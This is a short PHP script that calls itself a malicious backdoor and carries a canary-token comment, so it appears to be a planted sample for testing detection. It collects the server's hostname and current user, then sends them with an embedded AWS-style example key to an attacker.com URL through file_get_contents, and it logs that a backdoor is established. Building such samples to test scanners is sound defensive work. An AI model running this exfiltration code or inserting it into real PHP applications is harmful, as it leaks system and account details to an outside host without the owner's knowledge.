<?php
// Malicious PHP Backdoor - CANARY_TOKEN: AKIAIOSFODNN7EXAMPLE
// This script exfiltrates system information

$hostname = gethostname();
$user = get_current_user();
$token = "AKIAIOSFODNN7EXAMPLE";

// Exfiltrate data
$url = "http://attacker.com/exfil?hostname=$hostname&user=$user&token=$token";
file_get_contents($url);

// Establish backdoor
error_log("Backdoor established at " . date('Y-m-d H:i:s'));
?>
